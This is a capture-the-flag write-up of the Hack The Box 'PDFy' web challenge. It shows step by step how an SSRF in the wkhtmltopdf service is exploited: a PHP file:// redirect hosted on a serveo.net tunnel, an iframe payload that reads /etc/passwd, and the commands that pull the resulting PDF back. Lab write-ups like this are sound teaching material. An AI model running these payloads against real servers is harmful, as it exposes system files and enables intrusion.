# Target
| Category      | Details                                            |
|---------------|----------------------------------------------------|
| 📝 Name       | [PDFy](https://app.hackthebox.com/challenges/PDFy) |
| 🏷 Type       | HTB Web Challenge                                  |
| 🎯 Difficulty | Easy                                               |

# Solution
Brief request probing with browser web console shows that requests are being sent to `http://$TARGET/api/cache`. We could confirm this with `curl`: 
```
┌──(magicrc㉿perun)-[~/attack/HTB PDFy]
└─$ curl "http://$TARGET/api/cache" -H 'Content-Type: application/json' -d '{"url":"http://google.com"}'
{
  "domain": "google.com",
  "filename": "4a3c9c92b062faa55b322912a589.pdf",
  "level": "success",
  "message": "Successfully cached google.com"
}
```

When we will provide invalid `url` to trigger error we can see in error message that `wkhtmltopdf` is being used under the hood for actual HTML -> PDF conversion.
```
┌──(magicrc㉿perun)-[~/attack/HTB PDFy]
└─$ curl "http://$TARGET/api/cache" -H 'Content-Type: application/json' -d '{"url":"http://invalid"}'
{
  "level": "error",
  "message": "There was an error: Error generating PDF: Command '['wkhtmltopdf', '--margin-top', '0', '--margin-right', '0', '--margin-bottom', '0', '--margin-left', '0', 'http://invalid', 'application/static/pdfs/845742f26b7d5004728adeadc516.pdf']' returned non-zero exit status 1."
}
```

`wkhtmltopdf` is vulnerable to SSRF, let's try to exploit this to include `/etc/passwd`. As this challenge operates outside HTB VPN we will use https://serveo.net/ to expose our C2.

```
┌──(magicrc㉿perun)-[~/attack/HTB PDFy]
└─$ ssh -R 80:localhost:80 serveo.net  
Forwarding HTTP traffic from https://3a3ec5498a744c307bc67ca14072c0db.serveo.net
```

With tunel established let's prepare and run our exploit.
```
┌──(magicrc㉿perun)-[~/attack/HTB PDFy]
└─$ echo '<?php header("location:file://".$_REQUEST["x"]); ?>' > /var/www/html/wkhtmltopdf_ssrf.php && \
echo '<iframe src=https://3a3ec5498a744c307bc67ca14072c0db.serveo.net/wkhtmltopdf_ssrf.php?x=/etc/passwd width=1000px height=1000px></iframe>' > /var/www/html/wkhtmltopdf_ssrf.html && \
PDF=$(curl -s "http://$TARGET/api/cache" -X POST -H 'Content-Type: application/json' -d '{"url":"https://3a3ec5498a744c307bc67ca14072c0db.serveo.net/wkhtmltopdf_ssrf.html"}' | jq -r .filename) && \
wget -qP /tmp $TARGET/static/pdfs/$PDF && \
pdftotext /tmp/$PDF - | grep HTB
flaguser:x:1001:1001:HTB{*************************},,,:/home/flaguser:/bin/bash
```